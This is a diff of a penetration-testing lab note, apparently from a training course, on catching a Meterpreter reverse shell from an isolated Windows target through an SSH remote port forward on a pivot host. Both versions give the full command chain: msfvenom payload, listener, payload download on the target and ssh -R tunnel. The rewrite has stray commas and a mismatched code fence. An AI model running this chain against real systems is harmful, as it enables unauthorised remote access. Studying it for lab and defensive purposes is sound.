@@ -1,45 +1,53 @@
-# SSH Remote Port Forwarding
+## Reverse Shell via SSH Remote Port Forwarding
 
-### Technique Overview
+**When to use** Target host is isolated from the attack network and cannot route traffic to `<ATTACK_IP>`, requiring a dual-homed pivot host to proxy the reverse connection,.
 
-**SSH Remote Port Forwarding** is utilized when a **target host** lacks a direct route to the **attack host** but can communicate with a **pivot host** that has access to both networks. This technique is essential for capturing **reverse shells** from internal systems that are restricted to their local subnet (e.g., 172.16.5.0/23) and cannot reach the external Academy Lab network.
+**Commands**
 
-### Operational Workflow
+1. Generate payload configured to call back to the pivot host's internal interface
 
-1. **Generate a Payload:** Create a Meterpreter payload using `msfvenom`. The **LHOST** must be the **internal IP of the pivot host** because the target cannot reach the attack machine directly.
-2. **Configure the Listener:** Set up a `multi/handler` on the attack machine. The **LPORT** should match the local port you intend to forward traffic to.
-3. **Transfer Payload to Pivot:** Move the executable from the attack host to the pivot host using `scp`.
-4. **Host the Payload:** Start a web server on the pivot host to allow the target machine to download the payload.
-5. **Download on Target:** Use PowerShell or a web browser on the target machine to retrieve the payload from the pivot host.
-6. **Establish SSH Remote Port Forward:** Run the SSH command from the **attack host** to the **pivot host**. This tells the pivot host to listen on a specific port and forward all incoming traffic back to the attack host's listener.
-7. **Execute and Catch:** Run the payload on the target. The connection travels to the pivot host, which forwards it through the SSH tunnel to the attack host.
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IP> LPORT=<PIVOT_PORT> -f exe -o <FILE_PATH>
+```
 
----
+2. Configure multi/handler to listen on all local interfaces
 
-### Command Reference
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport <ATTACK_PORT>
+run
+```
 
-|Action|Command|
-|:--|:--|
-|**Generate Payload**|`msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PIVOT_IP> -f exe -o backupscript.exe LPORT=<REMOTE_PORT>`|
-|**Start Listener**|`msf6 > use exploit/multi/handler` `msf6 > set payload windows/x64/meterpreter/reverse_https` `msf6 > set lhost 0.0.0.0` `msf6 > set lport <LOCAL_PORT>` `msf6 > run`|
-|**Transfer to Pivot**|`scp backupscript.exe <USERNAME>@<PIVOT_IP>:~/`|
-|**Host on Pivot**|`python3 -m http.server <PORT>`|
-|**Download on Target**|`Invoke-WebRequest -Uri "http://<PIVOT_IP>:<PORT>/backupscript.exe" -OutFile "C:\backupscript.exe"`|
-|**Setup Remote Forward**|`ssh -R <PIVOT_IP>:<REMOTE_PORT>:0.0.0.0:<LOCAL_PORT> <USERNAME>@<PIVOT_IP> -vN`|
+3. Transfer payload to pivot host
 
----
+```
+scp <FILE_PATH> <USERNAME>@<PIVOT_IP>:~/
+```
 
-### Key Parameters for SSH -R
+4. Start web server on pivot to facilitate download to the final target
 
-|Parameter|Description|
-|:--|:--|
-|`-R`|Asks the remote (pivot) server to listen on a specific port and forward connections back to the local (attack) host.|
-|`<PIVOT_IP>:<REMOTE_PORT>`|The IP and port the **pivot host** will listen on to receive the reverse shell.|
-|`0.0.0.0:<LOCAL_PORT>`|The local address and port on the **attack host** where the listener is running.|
-|`-vN`|**Verbose** output (helpful for debugging) and **No shell** (prevents opening an interactive login session).|
+```
+python3 -m http.server <PORT>
+```
 
-### Attack Implications
+5. Download payload on target via PowerShell
 
-- **Source Verification:** When checking `netstat` on the attack host, the incoming connection will appear as originating from `127.0.0.1` because traffic is received over the **local SSH socket**.
-- **Functionality:** This technique unlocks the ability to use **Meterpreter** features (e.g., Windows API exploitation, automated enumeration) that are unavailable via standard RDP or built-in Windows executables.
-- **Bypassing Isolation:** Successfully establishes a connection even when the target has **no direct routing** to the attack network.
+```
+Invoke-WebRequest -Uri "http://<PIVOT_IP>:<PORT>/<FILE_PATH>" -OutFile "C:\<FILE_PATH>"
+```
+
+6. Establish remote port forward to map the pivot's listening port to the attack host's listener
+
+````
+ssh -R <PIVOT_IP>:<PIVOT_PORT>:0.0.0.0:<ATTACK_PORT> <USERNAME>@<PIVOT_IP> -vN
+```,
+
+**Gotchas**
+- **LHOST must be set to the Pivot IP** in the payload generation, not the attack host, or the target will attempt to route to an unreachable network,.
+- **Incoming connection appears as 127.0.0.1** in Meterpreter because the traffic is received over a local SSH socket,.
+- **SSH -vN flags** are used to provide verbosity for troubleshooting and suppress the login shell to maintain the tunnel only.
+
+> ⚠️ Gap: Remote port forwarding to a specific interface (e.g., `<PIVOT_IP>`) typically requires **GatewayPorts** to be enabled in the pivot's `sshd_config`; otherwise, the port may only bind to the loopback interface, causing the target's connection to be refused.
+````
